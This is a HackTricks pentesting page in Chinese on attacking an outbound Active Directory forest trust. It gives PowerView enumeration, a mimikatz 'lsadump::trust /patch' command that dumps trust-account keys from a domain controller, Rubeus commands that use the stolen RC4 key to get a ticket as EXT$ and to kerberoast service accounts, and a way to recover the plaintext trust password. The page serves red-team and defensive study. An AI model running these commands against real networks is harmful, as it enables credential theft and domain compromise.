# 外部森林域 - 单向（出站）

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

在这种情况下，**您的域**正在向来自**不同域**的主体授予一些**特权**。

## 枚举

### 出站信任
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## 信任账户攻击

当两个域之间建立信任关系时，即域 **A** 和域 **B** 之间建立信任关系时存在安全漏洞，其中域 **B** 将其信任扩展到域 **A**。在这种设置中，在域 **A** 中为域 **B** 创建了一个特殊账户，该账户在两个域之间的身份验证过程中起着至关重要的作用。与域 **B** 关联的这个账户用于加密跨域访问服务的票据。

在这里需要理解的关键方面是，可以使用命令行工具从域 **A** 中的域控制器中提取此特殊账户的密码和哈希值。执行此操作的命令是：
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
这种提取是可能的，因为该帐户在其名称后面标有**$**，是活动的，并且属于域**A**的"Domain Users"组，从而继承与该组关联的权限。这允许个人使用该帐户的凭据对域**A**进行身份验证。

**警告：** 可以利用这种情况在域**A**中作为用户获得立足点，尽管权限有限。但是，这种访问权限足以在域**A**上执行枚举。

在`ext.local`是信任域，`root.local`是受信任域的情况下，将在`root.local`中创建一个名为`EXT$`的用户帐户。通过特定工具，可以转储Kerberos信任密钥，揭示`root.local`中`EXT$`的凭据。实现此目的的命令是：
```bash
lsadump::trust /patch
```
接下来，可以使用提取的RC4密钥通过另一个工具命令以`root.local\EXT$`的身份在`root.local`中进行身份验证：
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
这个认证步骤打开了在 `root.local` 内枚举甚至利用服务的可能性，比如执行 Kerberoast 攻击来提取服务账户凭据：
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 收集明文信任密码

在先前的流程中，使用了信任哈希而不是**明文密码**（也被**mimikatz转储**）。

可以通过将mimikatz的\[ CLEAR ]输出从十六进制转换并移除空字节‘\x00’来获取明文密码：

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

有时，在创建信任关系时，用户必须输入信任的密码。在此演示中，密钥是原始信任密码，因此是可读的。随着密钥循环（30天），明文将不再是可读的，但从技术上讲仍然可用。

明文密码可用于以信任帐户身份执行常规身份验证，这是使用信任帐户的Kerberos密钥请求TGT的替代方法。在此示例中，从ext.local查询root.local以获取Domain Admins的成员：

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## 参考

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** 上**关注我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
